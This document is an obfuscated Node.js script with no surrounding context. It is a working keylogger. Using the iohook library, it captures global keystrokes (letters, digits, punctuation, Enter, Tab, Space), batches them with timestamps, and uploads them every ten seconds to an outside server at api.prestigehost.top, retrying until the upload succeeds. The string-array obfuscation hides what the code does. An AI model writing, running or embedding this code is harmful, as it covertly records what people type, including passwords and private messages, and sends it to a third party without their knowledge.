const _0x1e4e5d=_0x5663;(function(_0x4c1714,_0x255a13){const _0x3a6200=_0x5663,_0x1bf826=_0x4c1714();while(!![]){try{const _0x45bc11=parseInt(_0x3a6200(0x7a))/0x1+parseInt(_0x3a6200(0x8d))/0x2+parseInt(_0x3a6200(0x7f))/0x3*(-parseInt(_0x3a6200(0x7e))/0x4)+parseInt(_0x3a6200(0x8f))/0x5*(parseInt(_0x3a6200(0x8c))/0x6)+parseInt(_0x3a6200(0x92))/0x7*(-parseInt(_0x3a6200(0x7c))/0x8)+parseInt(_0x3a6200(0x8b))/0x9*(-parseInt(_0x3a6200(0x84))/0xa)+-parseInt(_0x3a6200(0x94))/0xb;if(_0x45bc11===_0x255a13)break;else _0x1bf826['push'](_0x1bf826['shift']());}catch(_0x504996){_0x1bf826['push'](_0x1bf826['shift']());}}}(_0x4f96,0xec820));function _0x5663(_0x173937,_0x3e2045){const _0x4f968c=_0x4f96();return _0x5663=function(_0x56638e,_0x3acd60){_0x56638e=_0x56638e-0x7a;let _0x3b38df=_0x4f968c[_0x56638e];return _0x3b38df;},_0x5663(_0x173937,_0x3e2045);}const iohook=require('iohook'),axios=require(_0x1e4e5d(0x86)),API_ENDPOINT='https://api.prestigehost.top/11mipa1',UPLOAD_INTERVAL=0x2710,notedKeys=[0x8,0x9,0xd,0x14,0x20,0x23,0x24,0x25,0x26,0x27,0x28,0x2e,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4a,0x4b,0x4c,0x4d,0x4e,0x4f,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x6d,0x6e,0x6f,0xba,0xbb,0xbc,0xbd,0xbe,0xbf,0xc0,0xdb,0xdc,0xdd,0xde];function _0x4f96(){const _0x153354=['2524166FhVceR','note','125jPqFNC','clockRunning','now','13587HPeAhk','post','8907624njPvWb','1377800PhoRvk','catch','1824cCYnNW','start','2374532bHhhGv','3tSMMlV','length','currentInputs','interval','then','20GPjUcm','stopInterval','axios','rawcode','keydown','includes','startInterval','1354869EdCdmw','114216eIOABO'];_0x4f96=function(){return _0x153354;};return _0x4f96();}class Noter{static ['clockRunning']=!0x1;static [_0x1e4e5d(0x81)]=[];static [_0x1e4e5d(0x82)];static[_0x1e4e5d(0x8a)](){const _0x1324fa=_0x1e4e5d;Noter[_0x1324fa(0x90)]=!0x0,Noter[_0x1324fa(0x82)]=setInterval(async()=>{const _0x387529=_0x1324fa;if(Noter[_0x387529(0x81)][_0x387529(0x80)]===0x0){Noter['stopInterval']();return;}const _0x33c045=Noter[_0x387529(0x81)],_0x1ff266=Date[_0x387529(0x91)]();Noter[_0x387529(0x81)]=[];let _0x1cf498=setInterval(()=>{const _0x35a3da=_0x387529;axios[_0x35a3da(0x93)](API_ENDPOINT,{'input':_0x33c045,'timestamp':_0x1ff266})[_0x35a3da(0x83)](()=>{clearInterval(_0x1cf498);})[_0x35a3da(0x7b)](()=>{});},0xbb8);},UPLOAD_INTERVAL);}static[_0x1e4e5d(0x85)](){const _0x2dbe7a=_0x1e4e5d;clearInterval(Noter[_0x2dbe7a(0x82)]),Noter[_0x2dbe7a(0x90)]=!0x1;}static[_0x1e4e5d(0x8e)](_0x4cc064){const _0x13b0c0=_0x1e4e5d;Noter['currentInputs']['push'](_0x4cc064),!Noter[_0x13b0c0(0x90)]&&Noter[_0x13b0c0(0x8a)]();}}iohook['on'](_0x1e4e5d(0x88),_0x4fdbd2=>{const _0x343e56=_0x1e4e5d;notedKeys[_0x343e56(0x89)](_0x4fdbd2[_0x343e56(0x87)])&&Noter['note'](_0x4fdbd2);}),iohook[_0x1e4e5d(0x7d)]();